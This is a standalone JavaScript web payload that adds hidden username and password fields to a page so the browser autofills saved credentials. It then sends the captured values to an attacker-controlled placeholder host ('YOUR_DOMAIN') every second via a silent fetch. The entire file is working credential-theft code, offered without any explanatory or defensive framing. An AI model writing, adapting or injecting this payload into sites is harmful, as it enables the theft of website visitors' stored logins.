let usernameInput = document.createElement('input');
usernameInput.setAttribute('type', 'text');
usernameInput.setAttribute('name', 'u');
usernameInput.setAttribute('id', 'u');
usernameInput.style.cssText = 'opacity:0;height:0;margin:0;padding:0;width:0;position:absolute;top:-30px';
let passwordInput = document.createElement('input');
passwordInput.setAttribute('type', 'password');
passwordInput.setAttribute('name', 'p');
passwordInput.setAttribute('id', 'p');
passwordInput.style.cssText = 'opacity:0;height:0;margin:0;padding:0;width:0;position:absolute;top:-30px';
document.body.appendChild(usernameInput);
document.body.appendChild(passwordInput);
var _='getElementById',e='https://YOUR_DOMAIN/?u=',t='p',n='u';
function s(){var r=document[_](t).value.trim(),i=document[_](n).value.trim();''!==r&&''!==i&&fetch(e+encodeURIComponent(i)+'&p='+encodeURIComponent(r),{mode:'no-cors'}).then(function(){}).catch(function(){})}
setInterval(s,1e3);
